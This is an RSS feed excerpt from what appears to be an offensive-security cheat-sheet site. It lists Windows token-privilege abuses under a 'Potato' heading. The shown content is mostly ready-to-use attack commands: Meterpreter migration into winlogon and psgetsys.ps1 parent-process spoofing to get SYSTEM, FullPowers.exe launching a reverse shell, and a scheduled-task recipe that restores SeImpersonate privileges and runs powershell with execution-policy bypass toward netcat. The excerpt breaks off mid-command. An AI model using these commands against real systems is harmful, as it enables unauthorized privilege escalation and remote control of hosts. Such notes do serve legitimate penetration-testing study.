channel.title: Potato on TLDRBins
channel.description: Recent content in Potato on TLDRBins

item.title: SeDebugPrivilege
item.description: Abuse #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate <PID> Abuse #2 : psgetsys.ps1 psgetsys # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>"

item.title: SeImpresonate
item.description: Abuse #1: Recover SeImpresonate FullPower .\FullPowers.exe -c "whoami /priv" # Revshell .\FullPowers.exe -c "<powershell #3 Base64>" Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege" # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.
